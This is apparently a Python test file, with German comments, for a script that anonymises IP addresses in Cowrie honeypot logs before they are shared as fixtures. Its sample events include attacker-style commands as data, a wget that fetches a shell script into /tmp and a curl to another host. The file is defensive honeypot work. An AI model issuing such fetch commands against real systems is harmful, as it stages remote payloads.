"""Prüft die Anonymisierung in scripts/make-fixtures.py.

Das Skript läuft auf dem Sensor und entscheidet, was den Sensor verlässt. Geht
dabei etwas schief, landet eine echte Angreifer-Adresse im Repo (E-009). Die
Adressen in diesen Tests sind erfundene öffentliche Adressen.
"""

from __future__ import annotations

import importlib.util
import json
from pathlib import Path

SENSOR = Path(__file__).resolve().parents[1]
SCRIPT = SENSOR / "scripts" / "make-fixtures.py"

spec = importlib.util.spec_from_file_location("make_fixtures", SCRIPT)
make_fixtures = importlib.util.module_from_spec(spec)
assert spec.loader is not None
spec.loader.exec_module(make_fixtures)


def event(**fields):
    base = {
        "eventid": "cowrie.session.connect",
        "timestamp": "2026-09-17T14:26:31.000000Z",
        "session": "0123456789ab",
        "src_ip": "45.148.10.7",
        "dst_ip": "195.201.127.108",
        "sensor": "hp-a",
    }
    base.update(fields)
    return base


def test_same_address_always_becomes_the_same_replacement():
    addresses = make_fixtures.AddressMap()
    first = addresses.for_attacker("45.148.10.7")
    second = addresses.for_attacker("45.148.10.7")
    assert first == second == "203.0.113.1"


def test_different_addresses_get_different_replacements():
    addresses = make_fixtures.AddressMap()
    assert addresses.for_attacker("45.148.10.7") != addresses.for_attacker("45.148.10.8")


def test_ipv6_is_mapped_into_the_documentation_range():
    addresses = make_fixtures.AddressMap()
    assert addresses.for_attacker("2a01:4f8:c17:3201::99").startswith("2001:db8::")


def test_the_sensor_gets_its_own_replacement():
    addresses = make_fixtures.AddressMap()
    assert addresses.for_sensor("195.201.127.108") == "198.51.100.1"


def test_longer_addresses_are_replaced_first():
    """Sonst zerschneidet 10.1.1.1 einen Treffer in 10.1.1.10."""
    addresses = make_fixtures.AddressMap()
    addresses.for_attacker("10.1.1.1")
    addresses.for_attacker("10.1.1.10")
    replaced = addresses.replace_everywhere("10.1.1.10")
    assert replaced == "203.0.113.2"


def test_addresses_are_replaced_inside_commands_and_messages():
    events = [
        event(),
        event(
            eventid="cowrie.command.input",
            input="wget http://45.148.10.7/x.sh -O /tmp/x.sh",
            message="CMD: wget http://45.148.10.7/x.sh",
        ),
    ]
    cleaned = make_fixtures.anonymize(events, make_fixtures.AddressMap())
    as_text = json.dumps(cleaned)
    assert "45.148.10.7" not in as_text
    assert "195.201.127.108" not in as_text
    assert "203.0.113.1" in cleaned[1]["input"]


def test_addresses_of_others_stay(mapped=None):
    """Eine fremde Adresse im Befehl gehört zur Untersuchung und bleibt."""
    events = [event(eventid="cowrie.command.input", input="curl http://198.18.7.9/a")]
    cleaned = make_fixtures.anonymize(events, make_fixtures.AddressMap())
    assert "198.18.7.9" in cleaned[0]["input"]


def test_public_addresses_in_the_participant_fields_are_detected():
    real = [event()]
    cleaned = make_fixtures.anonymize(real, make_fixtures.AddressMap())
    fields = make_fixtures.SOURCE_FIELDS + make_fixtures.SENSOR_FIELDS
    assert make_fixtures.contains_public_address(real, fields) is True
    assert make_fixtures.contains_public_address(cleaned, fields) is False


def test_sessions_are_classified_for_the_selection():
    with_commands = [event(), event(eventid="cowrie.command.input", input="uname -a")]
    only_login = [event(), event(eventid="cowrie.login.success")]
    failed = [event(), event(eventid="cowrie.login.failed")]
    assert make_fixtures.classify(with_commands) == "mit_befehlen"
    assert make_fixtures.classify(only_login) == "login_ohne_befehl"
    assert make_fixtures.classify(failed) == "login_fehlgeschlagen"
    assert make_fixtures.classify([event()]) == "nur_verbindung"
